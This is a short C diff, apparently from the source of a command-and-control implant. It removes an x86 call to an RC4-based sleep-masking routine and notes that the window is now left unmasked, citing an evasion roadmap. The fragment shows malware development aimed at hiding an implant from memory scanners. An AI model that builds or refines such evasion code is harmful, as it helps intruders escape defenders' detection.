@@ -44,11 +44,9 @@ void GargleSleep(DWORD time) {
 		return;
 	g3_log("gargle: gen3 fell back to official path", 0x7fffffff);
 #else
-	/* x86: gen3-1a (own-table RC4 masking, no ROP) replaces the official
-	 * sleepmask BOF, which crashes at blob+0x3b in our WOW64 layout.
-	 * Serving the window directly also skips the whole decode path. */
-	if (gen3_sleep(time))
-		return;
+	/* x86: no gen3 (size budget) and the official sleepmask BOF crashes in
+	 * WOW64 - the window is served unmasked by design. See
+	 * EVASION-ROADMAP section 13.6 for the size numbers. */
 	Sleep(time);
 	return;
 #endif
